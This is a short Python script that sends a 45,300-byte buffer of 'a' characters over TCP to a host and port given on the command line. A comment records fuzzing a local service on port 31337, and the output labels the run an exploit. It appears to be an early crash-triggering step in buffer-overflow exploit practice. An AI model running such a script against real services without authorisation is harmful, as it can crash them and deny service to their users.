import socket
import sys

# [*]Fuzzing 127.0.0.1 31337 with 45302 bytes...

if __name__=="__main__":
	# do magic
	
	usage = "[*]Usage: {} [ip] [port]".format(sys.argv[0])

	if len(sys.argv) == 1:
		print(usage)
		sys.exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	buf = "a" * 45300
	buf += "\r\n"

	print("exploit with {} bytes".format(len(buf)))

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((str(ip),int(port)))
	s.send(buf.encode())